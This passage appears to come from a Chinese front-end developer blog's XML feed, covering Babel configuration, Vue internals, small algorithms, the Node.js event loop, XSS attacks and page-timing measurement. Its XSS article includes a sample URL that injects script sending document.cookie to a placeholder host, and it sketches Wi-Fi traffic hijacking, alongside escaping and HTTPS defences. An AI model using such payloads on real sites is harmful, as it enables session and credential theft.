虽然这个插件能避免一个文件多次引用助手函数，但是并不能直接避免多个文件内重复引用，这与前面说到的通过transform添加polyfill是一样的问题，这些引用都只是module级别的，在打包工具盛行的今天，需要考虑如何减少多个模块重复引用相同代码造成代码冗余。 当然也可以在每个需要使用helpers的js文件顶部直接引入之前生成的helpers文件既可，通过打包工具将这个公共模块进行抽离。1require('helpers'); 在说完babel的helpers之后就到了插件系统的最后的一个插件：transform-runtime。前面在transform-polyfill的时候也有提到这个插件，之所以把它放到helpers后面是因为这个插件能自动为项目引入polyfill和helpers。1cnpm install -D babel-plugin-transform-runtime babel-runtime transform-runtime这个插件依赖于babel-runtime，所以安装transform-runtime的同时最好也安装babel-runtime，为了防止一些不必要的错误。babel-runtime由三个部分组成： 1、core-js core-js极其强悍，通过ES3实现了大部分的ES5、6、7的垫片，作者zloirock是来自战斗名族的程序员，一个人维护着core-js，听说他最近还在找工作，上面是core-js的github地址，感兴趣可以去看看。 2、regenerator regenerator来自facebook的一个库，用于实现 generator functions。 3、helpers babel的一些工具函数，没错，这个helpers和前面使用babel-external-helpers生成的helpers是同一个东西从babel-runtime的package.json文件中也能看出，runtime依赖了哪些东西。 安装有babel-runtime之后要引入helpers可以使用如下方式：1require('babel-runtime/helpers'); 使用runtime的时候还有一些配置项：123456789&#123; "plugins": [ ["transform-runtime", &#123; "helpers": false, //自动引入helpers "polyfill": false, //自动引入polyfill（core-js提供的polyfill） "regenerator": true, //自动引入regenerator &#125;] ]&#125; 比较transform-runtime与babel-polyfill引入垫片的差异： 1、使用runtime是按需引入，需要用到哪些polyfill，runtime就自动帮你引入哪些，不需要再手动一个个的去配置plugins，只是引入的polyfill不是全局性的，有些局限性。而且runtime引入的polyfill不会改写一些实例方法，比如Object和Array原型链上的方法，像前面提到的Array.protype.includes。 2、babel-polyfill就能解决runtime的那些问题，它的垫片是全局的，而且全能，基本上ES6中要用到的polyfill在babel-polyfill中都有，它提供了一个完整的ES6+的环境。babel官方建议只要不在意babel-polyfill的体积，最好进行全局引入，因为这是最稳妥的方式。 3、一般的建议是开发一些框架或者库的时候使用不会污染全局作用域的babel-runtime，而开发web应用的时候可以全局引入babel-polyfill避免一些不必要的错误，而且大型web应用中全局引入babel-polyfill可能还会减少你打包后的文件体积（相比起各个模块引入重复的polyfill来说）。 presets显然这样一个一个配置插件会非常的麻烦，为了方便，babel为我们提供了一个配置项叫做persets（预设）。 预设就是一系列插件的集合，就好像修图一样，把上次修图的一些参数保存为一个预设，下次就能直接使用。 如果要转译ES6语法，只要按如下方式配置即可：12345678910111213141516171819202122232425//先安装ES6相关preset： cnpm install -D babel-preset-es2015&#123; "presets": ["es2015"]&#125;//如果要转译的语法不止ES6，还有各个提案阶段的语法也想体验，可以按如下方式。//安装需要的preset： cnpm install -D babel-preset-stage-0 babel-preset-stage-1 babel-preset-stage-2 babel-preset-stage-3&#123; "presets": [ "es2015", "stage-0", "stage-1", "stage-2", "stage-3", ]&#125;//同样babel也能直接转译jsx语法，通过引入react的预设//cnpm install -D babel-preset-react&#123; "presets": [ "es2015", "react" ]&#125; 不过上面这些preset官方现在都已经不推荐了，官方唯一推荐preset：babel-preset-env。 这款preset能灵活决定加载哪些插件和polyfill，不过还是得开发者手动进行一些配置。1234567891011121314151617181920212223242526// cnpm install -D babel-preset -env&#123; "presets": [ ["env", &#123; "targets": &#123; //指定要转译到哪个环境 //浏览器环境 "browsers": ["last 2 versions", "safari &gt;= 7"], //node环境 "node": "6.10", //"current" 使用当前版本的node &#125;, //是否将ES6的模块化语法转译成其他类型 //参数："amd" | "umd" | "systemjs" | "commonjs" | false，默认为'commonjs' "modules": 'commonjs', //是否进行debug操作，会在控制台打印出所有插件中的log，已经插件的版本 "debug": false, //强制开启某些模块，默认为[] "include": ["transform-es2015-arrow-functions"], //禁用某些模块，默认为[] "exclude": ["transform-es2015-for-of"], //是否自动引入polyfill，开启此选项必须保证已经安装了babel-polyfill //参数：Boolean，默认为false. "useBuiltIns": false &#125;] ]&#125; 关于最后一个参数useBuiltIns，有两点必须要注意： 1、如果useBuiltIns为true，项目中必须引入babel-polyfill。 2、babel-polyfill只能被引入一次，如果多次引入会造成全局作用域的冲突。 做了个实验，同样的代码，只是.babelrc配置中一个开启了useBuiltIns，一个没有，两个js文件体积相差70K，戳我看看。 文件 大小 useBuiltIns.js 189kb notUseBuiltIns.js 259kb 最后啰嗦一句 关于polyfill还有个叫做polyfill.io的神器，只要在浏览器引入 https://cdn.polyfill.io/v2/po… 服务器会更具浏览器的UserAgent返回对应的polyfill文件，很神奇，可以说这是目前最优雅的解决polyfill过大的方案。]]></content>
      <categories>
        <category>综合</category>
      </categories>
      <tags>
        <tag>工具配置</tag>
        <tag>babel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue_vue数据监听原理]]></title>
    <url>%2F2018%2F05%2F30%2FVue_vue%E4%BB%A3%E7%A0%81%E7%BA%A7%E6%A1%86%E6%9E%B6%E6%B5%81%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[vue整体框架和主要流程分析之前对看过比较多关于vue源码的文章，但是对于整体框架和流程还是有些模糊，最后用chrome debug对vue的源码进行查看整理出这篇文章。。。。 本文对vue的整体框架和整体流程进行简要的分析，不对某些具体的细节进行分析，所有需要对vue有初步的认识，包括对Object.defineProperty、虚拟DOM有一定了解，本文不会对Object.defineProperty、虚拟DOM的原理和细节进行分析。vue大体可以分两个部分： 1.采用Object.defineProperty进行数据的双向绑定； 2.采用虚拟DOM技术进行视图渲染； vue入口 vue构造函数调用了this._init(options)方法，这个方法在initMixin中，如上图所示，进入initMixin initMixin主要完成数据的初始化和视图的初始化： 1.数据初始化主要是数据的observe，在上图的initState中进行； 2.视图的初始化在vm.$mount(vm.$options.el),其中vm为Vue的实例，watcher的设置也是在vm.$mount(vm.$options.el）中完成的； 我们可以看到这里定义了beforeCreated和created这两个钩子函数。 数据初始化接着上面我们看看数据初始化都做了什么，进入initState 这里我们主要对数据进行操作的是initData，传入的是vm，我们来具体看看initData： 我们先忽略前面的一些逻辑判断，主要看两个地方： 1.数据代理，主要是将_data的数据代理到vm上，这样的话可以直接对vm上的数据进行修改; 2.数据observe，传入data； 我们先看看vue怎么对数据进行observe的，进入observe 在observe里返回的是ob，也就是Observer类的实例，我们看看Observer类是怎么定义的，进入Observer类 如上图在对data进行observe时对数组进行了特殊的处理，这块我们先不看，先看一般情况下的处理，即调用this.walk(value) walk主要对data的属性进行遍历，进入defineReactive 可以看到Object.defineProperty是在这里对属性设置get和set的，其中get主要进行依赖收集，其实就是在收集视图渲染的watcher，后面会提到，set主要是数据更新时进行视图的更新 至此，数据的初始化就完成了，从上面的分析来看，数据的初始化主要的工作就是对数据进行observe。 视图挂载接着上面，在vue入口那里，我们知道视图的挂载主要是调用了vm.$mount(vm.$options.el) 如图，所以我们进入vm.$mount，看看里面都干了啥，在源码里面有两处地方涉及到$mount 这是第一处，就是return mountComponent 这是第二处 咱们看看第二处，里面做了一个处理，就是将template编译成render函数，在vue的教程里有render函数的使用，这里我们可以看出我们在组件里定义render函数会比定义template快，因为在定义template的组件挂载时多了一步将template编译成render函数； 第二处的return 还是调用了第一处，所以我们看看第一处调用的mountComponent方法，进入mountComponent 这里我们可以看到定义了两个钩子beforeMount和mount，中间调用了watcher，我们看一下这里watcher的定义，这里标注的不太好，挡住了。。。我们看看watcher的这行代码：1vm._watcher=new Watcher(vm,updateComponent,noop) 我们可以看到Watcher类主要传入了vm,updateComponent,noop三个参数，其中updateComponent的主要作用是将虚拟DOM转化为真实的DOM并进行挂载，具体的细节下面在讨论，我们下面看看Watcher类是怎么定义的，进入Watcher 这里我们注意两个地方，一个是this.getter的定义，这里就是上面传进来的updateComponent，还有就是执行this.get()，我们进入这个get方法 这里我们看到首先收集的依赖是当前watcher实例，然后调用getter方法也就是updateComponent方法，之前我们对updateComponent方法的作用进行了简单的说明，这里我们具体看看updateComponent都干了啥，进入updateComponent: 这里调用了vm._update方法，其中传入的参数有vm._render()，_render函数主要的作用是产生虚拟DOM，进入_update 这里主要是将虚拟DOM转化为真实DOM并进行挂载，分两种情况，分别是有旧的虚拟DOM和无旧的虚拟DOM，对应初始化时调用还是数据更新时调用,这里定义了一个钩子beforeUpdate 到这里，视图的初始化和挂载也结束了，下面看看数据变化时视图是如何更新的 数据变化时视图更新过程接着上面我们看看数据变化时视图是怎么变化的，在数据初始化的时候，我们知道数据变化时将触发set方法，如下图： 上图可以看出，set最后调用了dep.notify，进入notify 如上图，notify主要将收集的依赖，也就是收集的所有watcher，调用所有watcher的update方法，我们看看watcher的updata方法干了啥 这里就是调用了queueWatcher,进入queueWatcher 这里采用队列异步更新，就是讲=将watcher push进队列queue中，然后执行nextTick方法，进入nextTick 这个部分有点难看，cb为传入的flushSchedulerQueue函数，执行timerFunc，将nextTickHander加入异步队列，执行nextTickHander，执行cb，既执行flushSchedulerQueue，进入flushSchedulerQueue 主要看watcher.run(),进入watcher.run 执行了this.get()，即进入前面数据渲染和挂载的地方 到这里，vue整个的执行流程基本就结束了。 vue流程图盗用一下vue官网关于vue生命周期的图，对照之前的内容梳理一下：]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-常见算法]]></title>
    <url>%2F2018%2F05%2F30%2F%E7%AE%97%E6%B3%95_%E4%B8%89%E4%B8%AA%E5%B0%8F%E7%AE%97%E6%B3%95%E9%A2%98%2F</url>
    <content type="text"><![CDATA[计算一个二维数组全部组合1234567891011121314151617181920let array =[[1,2],[3,4,5],[6,7,8]]let len = array.length;let result = [];let indexMap = &#123;&#125;;function countResult(start) &#123; start++; for (indexMap[start] = 0; indexMap[start] &lt; array[start].length; indexMap[start]++) &#123; if (start &lt; len - 1) &#123; countResult(start); &#125; else if (start === len - 1) &#123; let temp = []; for (let i = len - 1; i &gt;= 0; i--) &#123; temp.push(array[start - i][indexMap[start - i]]); &#125; result.push(temp); &#125; &#125;&#125;countResult(-1);console.log(result); 青蛙跳台阶算法（斐波那契数列）12345678910111213function jumpFloor2(n) &#123; let target = 0, number1 = 1, number2 = 2; if (n &lt;= 0) return 0; if (n === 1) return 1; if (n === 2) return 2; for(let i = 3;i &lt;= n;i++) &#123; target = number1 + number2; number1 = number2; number2 = target; &#125; return target;&#125; 洗牌算法1234567function shuffle(array) &#123; for (let i = array.length; i--;) &#123; let j = Math.floor(Math.random() * (i + 1)); [array[i], array[j]] = [array[j], array[i]] &#125; return array;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>小算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECMA-运行机制之Event_Loop]]></title>
    <url>%2F2018%2F05%2F30%2FECMA_%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6%E4%B9%8BEvent-Loop%2F</url>
    <content type="text"><![CDATA[前言距离这篇文章完笔虽然才两个月，但是我已经对各种细节忘记得差不多（不常用的东西马上就忘记了，大脑内存不足会经常自动腾出空间记忆别的事情），各位如果有任何疑问我大概率是回答不上来，非常抱歉。另外我觉得深入折腾这种东西意义其实不是太大，还不如学习一下更加通用价值更加高的知识（例如算法、数据库原理、操作系统原理、tcp/ip协议、架构设计、高数线代概率统计等） 不同的event loopevent loop是一个执行模型，在不同的地方有不同的实现。浏览器和nodejs基于不同的技术实现了各自的event loop。网上关于它的介绍多如牛毛，但大多数是基于浏览器的，真正讲nodejs的event loop的并没有多少，甚至很多将浏览器和nodejs的event loop等同起来的。 我觉得讨论event loop要做到以下两点： 首先要确定好上下文，nodejs和浏览器的event loop是两个有明确区分的事物，不能混为一谈。 其次，讨论一些js异步代码的执行顺序时候，要基于node的源码而不是自己的臆想。 简单来讲， nodejs的event是基于libuv，而浏览器的event loop则在html5的规范中明确定义。 libuv已经对event loop作出了实现，而html5规范中只是定义了浏览器中event loop的模型，具体实现留给了浏览器厂商。 nodejs中的event loop关于nodejs中的event loop有两个地方可以参考，一个是nodejs官方的文档；另一个是libuv的官方的文档，前者已经对nodejs有一个比较完整的描述，而后者则有更多细节的描述。nodejs正在快速发展，源码变化很大，以下的讨论都是基于nodejs9.5.0。 （然而nodejs的event loop似乎比预料更加复杂，在查看nodejs源码的过程中我惊奇发现原来nodejs的event loop的某些阶段，还会将v8的micro task queue中的任务取出来运行，看来nodejs的浏览器的event loop还是存在一些关联，这些细节我们往后再讨论，目前先关注重点内容。） event loop的6个阶段（phase）nodejs的event loop分为6个阶段，每个阶段的作用如下（process.nextTick()在6个阶段结束的时候都会执行，文章后半部分会详细分析process.nextTick()的回调是怎么引进event loop，仅仅从uv_run()是找不到process.nextTick()是如何牵涉进来）： timers：执行setTimeout() 和 setInterval()中到期的callback。 I/O callbacks：上一轮循环中有少数的I/Ocallback会被延迟到这一轮的这一阶段执行 idle, prepare：仅内部使用 poll：最为重要的阶段，执行I/O callback，在适当的条件下会阻塞在这个阶段 check：执行setImmediate的callback close callbacks：执行close事件的callback，例如socket.on(“close”,func) 123456789101112131415161718 ┌───────────────────────┐┌─&gt;│ timers ││ └──────────┬────────────┘│ ┌──────────┴────────────┐│ │ I/O callbacks ││ └──────────┬────────────┘│ ┌──────────┴────────────┐│ │ idle, prepare ││ └──────────┬────────────┘ ┌───────────────┐│ ┌──────────┴────────────┐ │ incoming: ││ │ poll │&lt;─────┤ connections, ││ └──────────┬────────────┘ │ data, etc. ││ ┌──────────┴────────────┐ └───────────────┘│ │ check ││ └──────────┬────────────┘│ ┌──────────┴────────────┐└──┤ close callbacks │ └───────────────────────┘ event loop的每一次循环都需要依次经过上述的阶段。 每个阶段都有自己的callback队列，每当进入某个阶段，都会从所属的队列中取出callback来执行，当队列为空或者被执行callback的数量达到系统的最大数量时，进入下一阶段。这六个阶段都执行完毕称为一轮循环]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>Event-Loop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全-XSS攻击大全]]></title>
    <url>%2F2018%2F05%2F22%2F%E5%AE%89%E5%85%A8_XSS%E6%94%BB%E5%87%BB%E5%A4%A7%E5%85%A8%2F</url>
    <content type="text"><![CDATA[前端安全之XSS攻击XSS(cross-site scripting跨域脚本攻击) 攻击是最常见的web攻击，其重点是”跨域”和”客户端执行”。有人将XSS攻击分为三种，分别是： 1、Reflected XSS（基于反射的XSS攻击） 2、Stored XSS（基于存储的XSS攻击） 3、DOM-based or local XSS（基于DOM或本地的XSS攻击） Reflected XSS基于反射的XSS攻击，主要一搞站点服务端返回脚本，在客户端触发执行从而发起Web攻击。例子： 1、做个假设，当亚马逊在搜索书记，搜不到书的名字的时候显示提交的名称。 2、在搜索框搜索内容，填入”alert(“handsome body”)“,点击搜索 3、当前端页面没有对返回的数据进行过滤，直接显示在页面上，这是就会alert那个字符出来。 4、进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：1http://www.amazon.cn/search?name=&lt;script&gt;document.location='http://xxx/get?cookie='+document.cookie&lt;/script&gt; PS:这个地址当然是无效的，只是举个例子而已。 结论：如果只是1、2、3步做成功，那也只是自己折腾自己而已，如果第4步能做成功，才是个像样的XSS攻击。开发安全措施： 1、前端在显示服务端数据的时候，不仅是标签内容需要过滤、转义，就连属性值也都可能需要。 2、后端接收请求时，验证请求是否为攻击请求，攻击则屏蔽。 例如：标签：1&lt;span&gt;&lt;script&gt;alert('handsome boy')&lt;/script&gt;&lt;/span&gt; 转义1&lt;span&gt;&amp;lt;script&amp;gt;alert(&amp;#39;handsome boy&amp;#39;)&amp;lt;/script&amp;gt&lt;/span&gt; 属性：如果input的value属性值是1琅琊榜" onclick="javascript:alert('handsome boy') 就可能出现1&lt;input type="text" value="琅琊榜" onclick="javascript:alert('handsome boy')"&gt; 点击input导致攻击脚本被执行，解决方式可以对script或者双引号进行过滤。 Stored XSS基于存储的XSS攻击，是通过发表带有恶意跨域脚本的帖子/文章，从而把恶意脚本存储在服务器，每个访问该帖子/文章的人就会被触发执行。例子 1、发一篇文章，里面包含恶意脚本 1今天天气不错啊！&lt;script&gt;alert('handsome boy')&lt;/script&gt; 2、后端没有对文章进行过滤，直接保存文章内容到数据库。 3、当其他人看这篇文章的时候，包含的恶意脚本就会执行。 PS:因为大部分文章是保存整个HTML内容的，前端显示的时候不做过滤，就极可能需要做些处理了。 结论：后端尽可能对提交的数据做过滤，在场景需求而不过滤的情况下，前端就需要做些处理了。开发安全措施： 1、首要是服务端要进行过滤，因为前端的校验可以被绕过。 2、当服务端不校验的时候，前端要以各种方式过滤里面可能的恶意脚本，例如script标签，将特殊字符转化成HTML编码。 DOM-based or local XSS基于DOM或者本地的XSS攻击。一般是提供免费的wifi，但是提供免费wifi的网关会忘你访问的任何页面插入一段脚本或者直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。例子1： 1、提供一个免费的wifi 2、开启一个特殊的DNS服务，将所有域名都解析到我们的电脑上，并把Wifi的DHCP-DNS设置为我们的电脑IP 3、之后脸上wifi的用户打开任何网站，请求都被我们截取到。我们根据http头中的host字段来转发到真正的服务器上。 4、收到服务器返回的数据之后，我们就可以网页脚本的注入，并返回给用户。 5、当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。 这个其就是wifi流量劫持，中间人可以看到用户的每一个请求，可以在页面嵌入恶意代码，使用恶意代码获取用户的信息，可以返回钓鱼页面。 例子2： 1、还是提供一个免费wifi 2、在我们电脑上抓包 3、分析数据，可以获取用户的微信朋友圈、邮箱、社交网站账号数据（HTTP）等。 PS：这个是我的测试，在51job页面登录时进行抓包，可以获取账号密码。结论：这攻击其实跟网站本身没什么联系，只是数据被中间人获取而已，而由于HTTP是明文传输的，所以是极可能被且与的。开发安全措施： 1、使用HTTPS，HTTPS会在请求数据之前进行一次握手，使得客户端与服务端都有一个私钥，服务端用这个私钥加密，客户端用这个私钥解密，这样即使数据被人截取了也是加密后的数据。 总结XSS攻击的特点就是：尽一切办法在目标网站上执行非目标网站的脚本。本地的XSS攻击的示例2其实不算XSS攻击，只是简单的流量劫持。前两种XSS攻击是我们开发时要注意的，而流量劫持的则可以使用HTTPS提高安全性。]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[性能-白屏-首屏-可操-加载完毕时间点计算方法]]></title>
    <url>%2F2018%2F05%2F11%2F%E6%80%A7%E8%83%BD_%E7%99%BD%E5%B1%8F-%E9%A6%96%E5%B1%8F-%E5%8F%AF%E6%93%8D-%E5%8A%A0%E8%BD%BD%E5%AE%8C%E6%AF%95%E6%97%B6%E9%97%B4%E7%82%B9%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1.关键点分页面、区域、浏览器、性能指标 页面的性能指标详解： 白屏时间（first Paint Time）——用户从打开页面开始到页面开始有东西呈现为止 首屏时间——用户浏览器首屏内所有内容都呈现出来所花费的时间 用户可操作时间(dom Interactive)——用户可以进行正常的点击、输入等操作，默认可以统计domready时间，因为通常会在这时候绑定事件操作 总下载时间——页面所有资源都加载完成并呈现出来所花的时间，即页面 onload 的时间 确定统计起点： 我们需要在用户输入 URL 或者点击链接的时候就开始统计，因为这样才能衡量用户的等待时间。高端浏览器Navigation Timing接口；普通浏览器通过 cookie 记录时间戳的方式来统计，需要注意的是 Cookie 方式只能统计到站内跳转的数据。 2.如何统计性能指标的时间2.1白屏时间公式：白屏时间 = 开始渲染耗时(首字节时间+HTML下载完成时间) + 头部资源加载耗时 如何获取chrome 高版本window.chrome.loadTimes().firstPaintTime loadTimes获取的结果1234567891011121314&#123; connectionInfo: "http/1", finishDocumentLoadTime: 1422412260.278667, finishLoadTime: 1422412261.083637, firstPaintAfterLoadTime: 1422412261.094726, firstPaintTime: 1422412258.085214, navigationType: "Reload", npnNegotiatedProtocol: "unknown", requestTime: 0, startLoadTime: 1422412256.920803, wasAlternateProtocolAvailable: false, wasFetchedViaSpdy: false, wasNpnNegotiated: false&#125; 所以计算公式：1(window.chrome.loadTimes().firstPaintTime - window.chrome.loadTimes().startLoadTime)*1000 其他浏览器：大部分浏览器没有特定函数，必须想其他办法来监测。仔细观察 WebPagetest 视图分析发现，白屏时间出现在头部外链资源加载完附近，因为浏览器只有加载并解析完头部资源才会真正渲染页面。基于此我们可以通过获取头部资源加载完的时刻来近似统计白屏时间。尽管并不精确，但却考虑了影响白屏的主要因素：首字节时间和头部资源加载时间（HTML下载完成时间非常微小）。有一个点:mod_36ad799.js等几个js为什么会在hm.js之前下载？html代码如下这貌似与我们熟知的脚本阻塞解析不符啊，理应是脚本插入hm.js在先，导致DOM树改变，重新绘制DOM树，然后继续往下解析……原因是现在的浏览器对这个过程做了优化： 处理脚本及样式表的顺序（The order of processing scripts and style sheets） 脚本 web的模式是同步的，开发者希望解析到一个script标签时立即解析执行脚本，并阻塞文档的解析直到脚本执行完。如果脚本是外引的，则网络必须先请求到这个资源——这个过程也是同步的，会阻塞文档的解析直到资源被请求到。这个模式保持了很多年，并且在html4及html5中都特别指定了。开发者可以将脚本标识为defer，以使其不阻塞文档解析，并在文档解析结束后执行。Html5增加了标记脚本为异步的选项，以使脚本的解析执行使用另一个线程。 预解析（Speculative parsing） Webkit和Firefox都做了这个优化，当执行脚本时，另一个线程解析剩下的文档，并加载后面需要通过网络加载的资源。这种方式可以使资源并行加载从而使整体速度更快。需要注意的是，预解析并不改变Dom树，它将这个工作留给主解析过程，自己只解析外部资源的引用，比如外部脚本、样式表及图片。 样式表（Style sheets） 样式表采用另一种不同的模式。理论上，既然样式表不改变Dom树，也就没有必要停下文档的解析等待它们，然而，存在一个问题，脚本可能在文档的解析过程中请求样式信息，如果样式还没有加载和解析，脚本将得到错误的值，显然这将会导致很多问题，这看起来是个边缘情况，但确实很常见。Firefox在存在样式表还在加载和解析时阻塞所有的脚本，而Chrome只在当脚本试图访问某些可能被未加载的样式表所影响的特定的样式属性时才阻塞这些脚本。 所以就得到了上面的那个结果 看看IE的处理 回归正题，普通浏览器需要获取两个时间：开始渲染耗时和头部资源加载耗时： 开始渲染时间： 需要借助浏览器的navigator timing属性performance； window.performance.timing（Navigation timing性能时间线） 相关属性：1234567891011121314// 在同一个浏览器上下文中，前一个网页（与当前页面不一定同域）unload 的时间戳，如果无前一个网页 unload ，则与 fetchStart 值相等navigationStart: 1441112691935,// 前一个网页（与当前页面同域）unload 的时间戳，如果无前一个网页 unload 或者前一个网页与当前页面不同域，则值为 0unloadEventStart: 0,unloadEventEnd: 0,// 第一个 HTTP 重定向发生时的时间。有跳转且是同域名内的重定向才算，否则值为 0redirectStart: 0,redirectEnd: 0, ... // 开始解析渲染 DOM 树的时间，此时 Document.readyState 变为 loading，并将抛出 readystatechange 相关事件domLoading: 1441112692690, ... 123var timing = performance.timing;var loadingTime = timing .domLoading - timing.navigationStart;//开始渲染时间 看一下navigator timing浏览器支持情况 规范 IE Firefox chrome Safari Opera iOS Safari Android Navigation Timing 9 31 全部 8 26 8（不包括8.1） 4.1 对于IE等低版本浏览器是不行的。 IE8 等低版本浏览器 通过 cookie 记录时间戳的方式来统计，需要注意的是 Cookie 方式只能统计到站内跳转的数据。 首次进入没有好的统计方法。 头部资源加载时间：123456789101112131415161718192021&lt;!DOCTYPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8"/&gt; &lt;script&gt; var start_time = +new Date; //测试时间起点，实际统计起点为 DNS 查询 &lt;/script&gt; &lt;!-- 3s 后这个 js 才会返回 --&gt; &lt;script src="script.php"&gt;&lt;/script&gt; &lt;script&gt; var end_time = +new Date; //时间终点 var headtime = end_time - start_time; //头部资源加载时间 console.log(headtime); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;在头部资源加载完之前页面将是白屏&lt;/p&gt; &lt;p&gt;script.php 被模拟设置 3s 后返回，head 底部内嵌 JS 等待前面 js 返回后才执行&lt;/p&gt; &lt;p&gt;script.php 替换成一个执行长时间循环的 js 效果也一样&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 这个比较简单，在head的前面计时开始，在head最末尾计时结束，中间的差值就计算为头部资源加载时间。 所以，最终计算方法:1var firstPaintTime = end_time - performance.timing.navigationStart 首屏时间 首屏时间的统计比较复杂，因为涉及图片等多种元素及异步渲染等方式。观察加载视图可发现，影响首屏的主要因素的图片的加载。通过统计首屏内图片的加载时间便可以获取首屏渲染完成的时间。统计流程如下： 首屏位置调用 API 开始统计 -&gt; 绑定首屏内所有图片的 load 事件 -&gt; 页面加载完后判断图片是否在首屏内，找出加载最慢的一张 -&gt; 首屏时间 这是同步加载情况下的简单统计逻辑，另外需要注意的几点： 页面存在 iframe 的情况下也需要判断加载时间 gif 图片在 IE 上可能重复触发 load 事件需排除 异步渲染的情况下应在异步获取数据插入之后再计算首屏 css 重要背景图片可以通过 JS 请求图片 url 来统计(浏览器不会重复加载) 没有图片则以统计 JS 执行时间为首屏，即认为文字出现时间1234567//IE gif重复onload解决var img=new Image();img.load=function()&#123;//do somethingimg.load=null;//重新赋值为null&#125;img.src='××.gif'; 统计方法1:原理：在首屏渲染之前埋上处理逻辑，使用定时器不断的去检测img节点的图片。判断图片是否在首屏和加载完成，找到首屏中加载时间最慢的的图片完成的时间，从而计算出首屏时间。如果首屏有没有图片，如果没图片就用domready时间。 缺点： 1.浏览器定时器最大精度为55ms 2.背景图片加载没有计算在内 3.不断检测并执行的脚本耗时1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768//1,获取首屏基线高度//2,计算出基线dom元素之上的所有图片元素//3,所有图片onload之后为首屏显示时间 function getOffsetTop(ele) &#123; var offsetTop = ele.offsetTop; if (ele.offsetParent !== null) &#123; offsetTop += getOffsetTop(ele.offsetParent); &#125; return offsetTop; &#125; var firstScreenHeight = win.screen.height; var firstScreenImgs = []; var isFindLastImg = false; var allImgLoaded = false; var t = setInterval(function() &#123; var i, img; if (isFindLastImg) &#123; if (firstScreenImgs.length) &#123; for (i = 0; i &lt; firstScreenImgs.length; i++) &#123; img = firstScreenImgs[i]; if (!img.complete) &#123; allImgLoaded = false; break; &#125; else &#123; allImgLoaded = true; &#125; &#125; &#125; else &#123; allImgLoaded = true; &#125; if (allImgLoaded) &#123; collect.add(&#123; firstScreenLoaded: startTime - Date.now() &#125;); clearInterval(t); &#125; &#125; else &#123; var imgs = body.querySelector('img'); for (i = 0; i &lt; imgs.length; i++) &#123; img = imgs[i]; var imgOffsetTop = getOffsetTop(img); if (imgOffsetTop &gt; firstScreenHeight) &#123; isFindLastImg = true; break; &#125; else if (imgOffsetTop &lt;= firstScreenHeight &amp;&amp; !img.hasPushed) &#123; img.hasPushed = 1; firstScreenImgs.push(img); &#125; &#125; &#125; &#125;, 0); doc.addEventListener('DOMContentLoaded', function() &#123; var imgs = body.querySelector('img'); if (!imgs.length) &#123; isFindLastImg = true; &#125; &#125;); win.addEventListener('load', function() &#123; allImgLoaded = true; isFindLastImg = true; if (t) &#123; clearInterval(t); &#125; collect.log(collect.global); &#125;); 统计方法2：原理：对于网页高度小于屏幕的网站来说，只要在页面底部加上脚本打印当前时间即可；或者对于网页高度大于一屏的网页来说，只要在估算接近于一屏幕的元素的位置后，打印一下当前时间。当然这个时间要得把首屏中所有图片的加载时间也算上。 缺点： 1.需要每个页面手动加入到对应位置 2.背景图片加载没有计算在内1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0"&gt; &lt;script type="text/javascript"&gt; window.logInfo = &#123;&#125;; window.logInfo.openTime = performance.timing.navigationStart; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt;这是第一屏，这是第一屏&lt;/div&gt; &lt;img src="http://static.oschina.net/uploads/space/2016/0623/152644_6UUC_1177792.png"&gt; &lt;img src="http://static.oschina.net/uploads/space/2016/0623/152644_6UUC_1177792.png"&gt; &lt;img src="http://static.oschina.net/uploads/space/2016/0623/152644_6UUC_1177792.png"&gt; &lt;img src="http://static.oschina.net/uploads/space/2016/0623/152644_6UUC_1177792.png"&gt; &lt;div&gt;第一屏结尾，第一屏结尾&lt;/div&gt; &lt;script type="text/javascript"&gt; (function logFirstScreen() &#123; var images = document.getElementsByTagName('img'); var iLen = images.length; var curMax = 0; var inScreenLen = 0; // 图片的加载回调 function imageBack() &#123; this.removeEventListener &amp;&amp; this.removeEventListener('load', imageBack, !1); if (++curMax === inScreenLen) &#123; // 如果所有在首屏的图片均已加载完成了的话，发送日志 log(); &#125; &#125; // 对于所有的位于指定区域的图片，绑定回调事件 for (var s = 0; s &lt; iLen; s++) &#123; var img = images[s]; var offset = &#123; top: 0 &#125;; var curImg = img; while (curImg.offsetParent) &#123; offset.top += curImg.offsetTop; curImg = curImg.offsetParent; &#125; // 判断图片在不在首屏 if (document.documentElement.clientHeight &lt; offset.top) &#123; continue; &#125; // 图片还没有加载完成的话 if (!img.complete) &#123; inScreenLen++; img.addEventListener('load', imageBack, !1); &#125; &#125; // 如果首屏没有图片的话，直接发送日志 if (inScreenLen === 0) &#123; log(); &#125; // 发送日志进行统计 function log () &#123; window.logInfo.firstScreen = +new Date() - window.logInfo.openTime; console.log('首屏时间：', window.logInfo.firstScreen + 'ms'); &#125; &#125;)(); &lt;/script&gt; &lt;img 